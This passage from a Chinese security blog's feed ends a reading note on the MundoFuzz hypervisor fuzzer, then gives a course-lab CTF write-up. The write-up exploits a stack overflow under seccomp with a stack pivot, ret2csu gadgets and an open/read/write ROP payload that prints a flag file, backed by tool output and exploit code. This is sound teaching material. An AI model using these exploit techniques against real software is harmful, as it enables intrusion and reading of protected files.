解决方案</h3><p>​\t\t修改寄存器的值,看代码覆盖面是否改变,如果改变了,那说明应该是换了个函数,未改变的话就是变了数据</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407102659000.png\" alt=\"image-20230407102659000\"></p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407102705309.png\" alt=\"image-20230407102705309\"></p>\n<h3 id=\"3-3-3-依赖关系\"><a href=\"#3-3-3-依赖关系\" class=\"headerlink\" title=\"3.3.3 依赖关系\"></a>3.3.3 依赖关系</h3><p>​\t\t例如先要enable才能对设备进行操作, find sector之后才能write data</p>\n<p>​\t\t同样的,对于DMA的依赖也可以通过指令直接看出来</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled6.png\" alt=\"Untitled\"></p>\n<h3 id=\"3-3-4-解决方案\"><a href=\"#3-3-4-解决方案\" class=\"headerlink\" title=\"3.3.4 解决方案\"></a>3.3.4 解决方案</h3><p>​\t\t针对语义:同样也是看代码覆盖,把前面的指令删除后,看是否影响后面的指令的代码覆盖面,如果影响的话,那应该就是有依赖关系</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled9.png\" alt=\"Untitled\"></p>\n<h3 id=\"3-3-5-解决方案总结\"><a href=\"#3-3-5-解决方案总结\" class=\"headerlink\" title=\"3.3.5 解决方案总结\"></a>3.3.5 解决方案总结</h3><p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407102611953.png\" alt=\"image-20230407102611953\"></p>\n<h2 id=\"3-4-依赖图生成\"><a href=\"#3-4-依赖图生成\" class=\"headerlink\" title=\"3.4 依赖图生成\"></a>3.4 依赖图生成</h2><p>​\t\t根据刚才的方法生成依赖图,方便后面用.. 懒得写了…</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407103601854.png\" alt=\"image-20230407103601854\"></p>\n<h1 id=\"四-MUNDOFUZZ的设计\"><a href=\"#四-MUNDOFUZZ的设计\" class=\"headerlink\" title=\"四. MUNDOFUZZ的设计\"></a>四. <strong>MUNDOFUZZ的设计</strong></h1><p>​\t\t整体设计如下:主要分了三部分,一部分是收集数据,第二部分是刚才重点分析的数据处理(消除噪音和语义推断),第三部分是fuzz的过程.</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled10.png\" alt=\"Untitled\"></p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled11.png\" alt=\"Untitled\"></p>\n<h2 id=\"4-1-收集Hypervisor输入数据\"><a href=\"#4-1-收集Hypervisor输入数据\" class=\"headerlink\" title=\"4.1 收集Hypervisor输入数据\"></a>4.1 收集Hypervisor输入数据</h2><p>​\t\t收集真实的数据,通过监测操作系统内核和设备之间的io交互,hook内核API,修改Linux内核,拦截请求开始-结束,进行切片</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled12.png\" alt=\"Untitled\"></p>\n<h3 id=\"4-1-1-记录-PIO-x2F-MMIO-操作\"><a href=\"#4-1-1-记录-PIO-x2F-MMIO-操作\" class=\"headerlink\" title=\"4.1.1 记录 PIO&#x2F;MMIO 操作\"></a>4.1.1 记录 PIO&#x2F;MMIO 操作</h3><p>记录对应的api即可</p>\n<h3 id=\"4-1-2-记录DMA操作\"><a href=\"#4-1-2-记录DMA操作\" class=\"headerlink\" title=\"4.1.2 记录DMA操作\"></a>4.1.2 记录DMA操作</h3><h3 id=\"4-1-3-记录DMA缓冲区的分配\"><a href=\"#4-1-3-记录DMA缓冲区的分配\" class=\"headerlink\" title=\"4.1.3 记录DMA缓冲区的分配\"></a>4.1.3 记录DMA缓冲区的分配</h3><h2 id=\"4-2-消除噪音和推断输入语义\"><a href=\"#4-2-消除噪音和推断输入语义\" class=\"headerlink\" title=\"4.2 消除噪音和推断输入语义\"></a>4.2 消除噪音和推断输入语义</h2><p>略</p>\n<h2 id=\"4-3-合成输入-进行fuz\"><a href=\"#4-3-合成输入-进行fuz\" class=\"headerlink\" title=\"4.3 合成输入,进行fuz\"></a>4.3 合成输入,进行fuz</h2><h3 id=\"4-3-1-噪音覆盖去除\"><a href=\"#4-3-1-噪音覆盖去除\" class=\"headerlink\" title=\"4.3.1 噪音覆盖去除\"></a>4.3.1 噪音覆盖去除</h3><p>因为是在fuzz的时候进行的,所以需要考虑性能的问题, 对算法进行了优化</p>\n<p>范围从单独的io操作提升到io请求(一组io操作),但比起输入仍然小很多(63比68574</p>\n<p>使用不用任何寄存器的输入来查找噪声</p>\n<h3 id=\"4-3-2-fuzz和输入合成\"><a href=\"#4-3-2-fuzz和输入合成\" class=\"headerlink\" title=\"4.3.2 fuzz和输入合成\"></a>4.3.2 fuzz和输入合成</h3><p>语义的正确性是一方面,寄存器的值的正确性也很重要</p>\n<p>工作流:生成,突变,更新</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled13.png\" alt=\"Untitled\"></p>\n<p>初始输入来源:1.预先储备的  2.根据依赖图和io请求语料库创建新的            5 5开</p>\n<p>突变阶段: 根据寄存器种类进行相应改变      不同种类,改变频率不同   控制寄存器(代表新的io请求)  </p>\n<p>语料库更新: 根据覆盖反馈更新   新的覆盖范围 -&gt; 输入语料库  如果属于新的io请求 -&gt; io请求语料库,更新依赖图</p>\n<h1 id=\"五-实际实现\"><a href=\"#五-实际实现\" class=\"headerlink\" title=\"五. 实际实现\"></a>五. 实际实现</h1><p>log系统: Linux 5.8.0</p>\n<p>fuzzer:基于AFL 2.57b</p>\n<p>MUNDOFUZZ-OS:基于xv6实现,从fuzzer中得到输入,中继到目标 </p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled14.png\" alt=\"Untitled\"></p>\n<h1 id=\"六-评估\"><a href=\"#六-评估\" class=\"headerlink\" title=\"六. 评估\"></a>六. 评估</h1><p>与目前最先进的hypervisor fuzz工具 hyper-cube和nyx进行对比</p>\n<p>回答了三个问题</p>\n<p>1.噪音消减技术是否提升了推断语义限制的准确性</p>\n<p>2.在覆盖率上和最先进的两款工具比怎么样</p>\n<p>3.它能发现未知的漏洞吗?</p>\n<h2 id=\"6-1-寄存器种类推断准确性\"><a href=\"#6-1-寄存器种类推断准确性\" class=\"headerlink\" title=\"6.1 寄存器种类推断准确性\"></a>6.1 寄存器种类推断准确性</h2><p>​\t\t进行了一个对比实验,不用噪音消除和用了之后的.综合来说整体提高了50%,效果很明显</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled15.png\" alt=\"Untitled\"></p>\n<p>​\t\t有一个是有问题的,降低了准确率,Floppy 因为它数据寄存器和命令寄存器复用了,但也好解决,混合类型进行推断即可</p>\n<h2 id=\"6-2-覆盖率对比\"><a href=\"#6-2-覆盖率对比\" class=\"headerlink\" title=\"6.2 覆盖率对比\"></a>6.2 覆盖率对比</h2><p>​\t\t实验跑了24小时,重复了8次(评估指南),和最先进的hypervisor fuzz工具相比,提高了5%左右</p>\n<p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/Untitled16.png\" alt=\"Untitled\"></p>\n<h2 id=\"6-3-新的漏洞\"><a href=\"#6-3-新的漏洞\" class=\"headerlink\" title=\"6.3 新的漏洞\"></a>6.3 新的漏洞</h2><p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407104306974.png\" alt=\"image-20230407104306974\"></p>\n<h3 id=\"漏洞案例\"><a href=\"#漏洞案例\" class=\"headerlink\" title=\"漏洞案例\"></a>漏洞案例</h3><p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407104327393.png\" alt=\"image-20230407104327393\"></p>\n<h1 id=\"七-总结\"><a href=\"#七-总结\" class=\"headerlink\" title=\"七. 总结\"></a>七. 总结</h1><p><img src=\"/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01-USENIX-MundoFuzz-Hypervisor-Fuzzing/image-20230407104340531.png\" alt=\"image-20230407104340531\"></p>\n",
            "tags": [
                "USENIX"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/",
            "url": "https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/",
            "title": "ucas-高级网络攻防-实验二-pwn1-栈",
            "date_published": "2023-04-04T00:31:49.000Z",
            "content_html": "<p>题目链接:<a href=\"https://tangzichengcc.github.io/2023/04/04/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/rop\">https://tangzichengcc.github.io/2023/04/04/ucas-高级网络攻防-实验二-pwn1-栈/rop</a></p>\n<p>课上的pwn的练习1,总结来说基础差的太多,一个是漏洞基础,应该先对相应的漏洞的简单题多练一练,深入理解原理,不然后面遇到一点问题就卡住了,另外还是有很多底层的原理,基础知识需要补.</p>\n<h1 id=\"第一章-解题过程描述\"><a href=\"#第一章-解题过程描述\" class=\"headerlink\" title=\"第一章 解题过程描述\"></a>第一章 解题过程描述</h1><h2 id=\"一-攻击流程图\"><a href=\"#一-攻击流程图\" class=\"headerlink\" title=\"一. 攻击流程图\"></a>一. 攻击流程图</h2><p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/orw.drawio.png\" alt=\"orw.drawio\"></p>\n<h2 id=\"二-详细解题过程\"><a href=\"#二-详细解题过程\" class=\"headerlink\" title=\"二. 详细解题过程\"></a>二. 详细解题过程</h2><h3 id=\"1-ida反汇编查看伪代码\"><a href=\"#1-ida反汇编查看伪代码\" class=\"headerlink\" title=\"1.ida反汇编查看伪代码\"></a>1.ida反汇编查看伪代码</h3><p>​\t\t可以发现有install_seccomp(argc, argv, envp);函数,说明安装了保护</p>\n<p>​\t\t漏洞点在vuln函数中,存在栈溢出,但只能溢出8字节,显然空间非常需要,需要利用其他技术来布置后续攻击代码</p>\n<h3 id=\"2-seccomp保护\"><a href=\"#2-seccomp保护\" class=\"headerlink\" title=\"2. seccomp保护\"></a>2. seccomp保护</h3><p>​\t\t利用工具seccomp-tools查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-24-10-ubuntu:/tmp/330# seccomp-tools dump ./rop </span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class=\"line\"> 0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x0a 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0014</span><br><span class=\"line\"> 0004: 0x15 0x08 0x00 0x00000002  if (A == open) goto 0013</span><br><span class=\"line\"> 0005: 0x15 0x07 0x00 0x00000101  if (A == openat) goto 0013</span><br><span class=\"line\"> 0006: 0x15 0x06 0x00 0x000001b5  if (A == 0x1b5) goto 0013</span><br><span class=\"line\"> 0007: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0013</span><br><span class=\"line\"> 0008: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0013</span><br><span class=\"line\"> 0009: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0013</span><br><span class=\"line\"> 0010: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0013</span><br><span class=\"line\"> 0011: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0013</span><br><span class=\"line\"> 0012: 0x06 0x00 0x00 0x00050005  return ERRNO(5)</span><br><span class=\"line\"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class=\"line\"> 0014: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这段代码的作用是在64位的x86架构上过滤掉不需要的系统调用，只允许执行一些特定的系统调用。如果系统调用是这些特定的系统调用之一，则允许执行，否则拒绝执行。</p>\n<p>​\t\t具体允许的只有open,read,write,exit及其变种. 并且限制了架构,不能使用其他架构下的系统调用. 那么常用的方法是,构造orw链,利用open read write系统调用来读取和打印flag文件.</p>\n<h3 id=\"3-寻找gadget\"><a href=\"#3-寻找gadget\" class=\"headerlink\" title=\"3. 寻找gadget\"></a>3. 寻找gadget</h3><h4 id=\"3-1-orw\"><a href=\"#3-1-orw\" class=\"headerlink\" title=\"3.1 orw\"></a>3.1 orw</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.plt.sec:0000000000401100 _open           proc near               ; CODE XREF: some_gifts+1D↓p</span><br><span class=\"line\">.plt.sec:0000000000401100                 endbr64</span><br><span class=\"line\">.plt.sec:0000000000401104                 bnd jmp cs:off_404040</span><br><span class=\"line\">.plt.sec:0000000000401104 _open           endp</span><br><span class=\"line\"></span><br><span class=\"line\">.plt.sec:00000000004010D0 _read           proc near               ; CODE XREF: vuln+40↓p</span><br><span class=\"line\">.plt.sec:00000000004010D0                 endbr64</span><br><span class=\"line\">.plt.sec:00000000004010D4                 bnd jmp cs:off_404028</span><br><span class=\"line\">.plt.sec:00000000004010D4 _read           endp</span><br><span class=\"line\"></span><br><span class=\"line\">.plt.sec:00000000004010C0 _write          proc near               ; CODE XREF: main+88↓p</span><br><span class=\"line\">.plt.sec:00000000004010C0                                         ; main+9E↓p</span><br><span class=\"line\">.plt.sec:00000000004010C0                 endbr64</span><br><span class=\"line\">.plt.sec:00000000004010C4                 bnd jmp cs:off_404020</span><br><span class=\"line\">.plt.sec:00000000004010C4 _write          endp</span><br></pre></td></tr></table></figure>\n\n<p>​\t或者用elf.plt[‘read’]来获取</p>\n<h4 id=\"3-2-gadget\"><a href=\"#3-2-gadget\" class=\"headerlink\" title=\"3.2 gadget\"></a>3.2 gadget</h4><p>​\t\tamd64-64-little, x64架构下,目前应用的调用约定是fastcal,前三个传参的寄存器是rdi rsi rdx </p>\n<p>​\t\t利用工具ROPgadget寻找可用的gadget,找到了rdi和rsi,未找到rdx,rdx的值并不一定总会影响函数的调用,要根据具体情况而定,在本题中,经过测试是会影响的,在read读取flag的时候,rdx代表着读取的长度,经过调试发现被设置为了0,所以读取的是空的.因此需要找到一个能设置rdx寄存器的gadget,会在后续章节说明.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-24-10-ubuntu:/tmp/330# ROPgadget --binary rop  --only &#x27;pop|ret&#x27;</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000000000040147c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040147e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000401480 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000401482 : pop r15 ; ret</span><br><span class=\"line\">0x000000000040147b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040147f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004011fd : pop rbp ; ret</span><br><span class=\"line\">0x0000000000401483 : pop rdi ; ret</span><br><span class=\"line\">0x0000000000401481 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040147d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040101a : ret</span><br><span class=\"line\">0x0000000000401277 : ret 0x2be</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 12</span><br><span class=\"line\"></span><br><span class=\"line\">0x0000000000401483 : pop rdi ; ret</span><br><span class=\"line\">0x0000000000401481 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"3-2-1-ret2csu\"><a href=\"#3-2-1-ret2csu\" class=\"headerlink\" title=\"3.2.1 ret2csu\"></a>3.2.1 ret2csu</h5><p>​\t\t不同架构的csu代码是不一样的,要根据具体情况而定,就此题的架构而言,csu代码如下</p>\n<p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/Untitled.png\" alt=\"Untitled\"></p>\n<p>​\t\t先执行loc_401476里面的代码,进行pop赋值,ret后再执行loc_401460的代码,对传参寄存器进行赋值,然后再利用call 转移控制流</p>\n<p>​\t\trdi rsi rdx 分别对应着第一次要输入的 r12,r13,r14,call的地址是[r15+rbx*8],可以设置r15为存储跳转地址的地址,rbx为0</p>\n<p>​\t\t设置rbp为1,rbx为0,即可继续往下执行</p>\n<h5 id=\"3-2-2-栈迁移的gadget\"><a href=\"#3-2-2-栈迁移的gadget\" class=\"headerlink\" title=\"3.2.2 栈迁移的gadget\"></a>3.2.2 栈迁移的gadget</h5><p>​\t\t由于只能溢出8字节,是不够布置gadget链的,需要扩展栈空间,通常用的手法是进行栈迁移,移动到一个更大的空间去</p>\n<p>​\t\tleave  &#x3D;&#x3D; mov rsp,rbp;pop rbp;<br>​\t\tret    &#x3D;&#x3D; pop rip <em>#弹出栈顶数据给rip寄存器</em></p>\n<p>​\t\t利用两次leave;ret; 即可控制rsp</p>\n<p>​\t\tmov rsp,rbp;    &#x2F;&#x2F;第一个rbp不受我们的控制，但是下面pop的rbp可以被我们更改，从而就可以控制第二个leave里面的rsp<br>​\t\tpop rbp;<br>​\t\tmov rsp,rbp;<br>​\t\tpop rbp;<br>​\t\tpop rip\t</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-24-10-ubuntu:/home/ubuntu/330# ROPgadget --binary rop  --only &#x27;leave|ret&#x27;</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x00000000004012a7 : leave ; ret</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-迁移到bss\"><a href=\"#4-迁移到bss\" class=\"headerlink\" title=\"4. 迁移到bss\"></a>4. 迁移到bss</h3><p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/stackpivot.drawio.png\" alt=\"stackpivot.drawio\"></p>\n<p>​\t\t只迁移是不够的,同时应该做到在迁移到的新地方布置好rop链,一个想法是,调用vuln()函数中的read,既可以读取0x110的数据,最后也有leave;ret;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000401304 loc_401304:                             ; CODE XREF: vuln+20↑j</span><br><span class=\"line\">.text:0000000000401304                 lea     rax, [rbp+buf]</span><br><span class=\"line\">.text:000000000040130B                 mov     edx, 110h       ; nbytes</span><br><span class=\"line\">.text:0000000000401310                 mov     rsi, rax        ; buf</span><br><span class=\"line\">.text:0000000000401313                 mov     edi, 0          ; fd</span><br><span class=\"line\">.text:0000000000401318                 call    _read</span><br><span class=\"line\">.text:000000000040131D                 nop</span><br><span class=\"line\">.text:000000000040131E                 leave</span><br><span class=\"line\">.text:000000000040131F                 retn</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t但是这里有一个问题,数据被写入的地方不是rbp,而是rbp-0x100,而经过两次leave;ret;后修改的rsp的值是原始rbp的值,所以还是到达不了rop链的位置,因此,需要第三次的leave;ret;再次修正rsp的位置,这样的话,在第二次leave;ret;的时候,rbp设置为写入地址-0x108,然后第三次leave;ret;就把rsp设置为了rop链的开头</p>\n<p>​\t\t设置成0x108是因为在最后一个leave;ret;的时候,mov rsp,rbp,转移栈成功后,要pop出来rbp然后栈往下移动8字节,这个多的0x8用来抵消pop rbp.</p>\n<h3 id=\"5-构造ROP链-实现orw\"><a href=\"#5-构造ROP链-实现orw\" class=\"headerlink\" title=\"5. 构造ROP链, 实现orw\"></a>5. 构造ROP链, 实现orw</h3><h4 id=\"5-1-构造orw\"><a href=\"#5-1-构造orw\" class=\"headerlink\" title=\"5.1 构造orw\"></a>5.1 构造orw</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = p64(poprdi) + p64(<span class=\"string\">&quot;0&quot;</span>) + p64(poprsi)+ p64(bssaddr2) +p64(<span class=\"number\">0</span>)+ p64(readaddr)</span><br><span class=\"line\">payload1 +=  p64(poprdi) +  p64(bssaddr2) + p64(poprsi) + p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(openaddr)</span><br><span class=\"line\">payload1 += p64(poprdi) + p64(<span class=\"number\">3</span>) + p64(poprsi) + p64(bssaddr2) +p64(<span class=\"number\">0</span>)+ p64(readaddr)</span><br><span class=\"line\">payload1 += p64(poprdi) + p64(<span class=\"number\">1</span>) + p64(poprsi) + p64(bssaddr2) +p64(<span class=\"number\">0</span>) +p64(writeaddr)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t四行的用途分别是</p>\n<p>​\t\t从用户标准输入中读取 .&#x2F;flag 字符,用于后面的open</p>\n<p>​\t\topen .&#x2F;flag 这个文件,得到文件句柄3</p>\n<p>​\t\tread 读取具柄3,读取到bss区域</p>\n<p>​\t\twrite 将flag所在bss区域内容输入到标准输出中</p>\n<p>​\t\t在调试中可以看到,在执行第三行操作,即read时,rdx的值被设置成了0,于是需要设置rdx的gadget</p>\n<p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/image-20230403142700054.png\" alt=\"image-20230403142700054\"></p>\n<h4 id=\"5-2-利用ret2csu构造-read的参数\"><a href=\"#5-2-利用ret2csu构造-read的参数\" class=\"headerlink\" title=\"5.2 利用ret2csu构造 read的参数\"></a>5.2 利用ret2csu构造 read的参数</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">csu_front_addr = 0x0000000000401460</span><br><span class=\"line\">csu_end_addr = 0x000000000040147a</span><br><span class=\"line\"></span><br><span class=\"line\">def csu(rbx, rbp, r12, r13, r14, r15):</span><br><span class=\"line\">\t\t# rdi rsi rdx 分别对应着 r12,r13,r14</span><br><span class=\"line\">\t\t# call的地址是[r15+rbx*8], 可以设置r15为地址,rbx为0</span><br><span class=\"line\">\t\t# r15这个地址存储的数据是要call的函数的地址</span><br><span class=\"line\">    payloadtemp = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payloadtemp += p64(csu_front_addr)</span><br><span class=\"line\">    return payloadtemp</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># r12 + rbx*8 = 0x0004010C0</span><br><span class=\"line\">temp = csu(0,1,3,bssaddr2,50,0x0404e24)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t要call的地址是[r15+rbx*8], 所以需要找到一个地址,存储着read函数的地址,在尝试利用5.1节第一行payload中存储rop链的中的bss地址中的read地址时发现,后面会被覆盖掉.可以在payload之后,再加上read函数的地址. 计算或者调试出存储其地址的地址.</p>\n<h4 id=\"5-3-利用ret2csu继续构造-write的参数\"><a href=\"#5-3-利用ret2csu继续构造-write的参数\" class=\"headerlink\" title=\"5.3 利用ret2csu继续构造 write的参数\"></a>5.3 利用ret2csu继续构造 write的参数</h4><p>​\t\t在上一步时,设置rbx&#x3D;1,rbp&#x3D;1,即可以让程序继续往下执行,进入第二轮ret2csu,与5.2中的方法类似,构造write的参数</p>\n<p>​\t\t完整exp见附录</p>\n<h1 id=\"第二章-题目技术点总结\"><a href=\"#第二章-题目技术点总结\" class=\"headerlink\" title=\"第二章 题目技术点总结\"></a>第二章 题目技术点总结</h1><h2 id=\"一-ORW\"><a href=\"#一-ORW\" class=\"headerlink\" title=\"一. ORW\"></a>一. ORW</h2><p>​\t\tORW利用了Linux中的open&#x2F;read&#x2F;write系统调用来执行操作,通常在限制了系统调用的时候使用,在ctf中根本目标是获取flag,所以在拿不到系统权限的时候可以通过该中方法进行获取flag.</p>\n<p>​\t\torw有很多种不同的系统调用可以使用,并且在不同架构下也有不一样的,根据seccomp具体的限制可以使用不同的方法.</p>\n<p>​\t\t需要注意的是,在做题目时,要根据具体的系统版本来寻找系统调用,在最新版本中有可能加入新的可用的系统调用.</p>\n<h2 id=\"二-seccomp\"><a href=\"#二-seccomp\" class=\"headerlink\" title=\"二. seccomp\"></a>二. seccomp</h2><p>​\t\tseccomp是一种在ctf pwn中常用的安全机制，可用于限制程序对系统调用的访问。通过使用seccomp，可以有效地降低程序受到攻击的风险。</p>\n<h2 id=\"三-ret2csu\"><a href=\"#三-ret2csu\" class=\"headerlink\" title=\"三. ret2csu\"></a>三. ret2csu</h2><p>​\t\tret2csu是一种在ctf 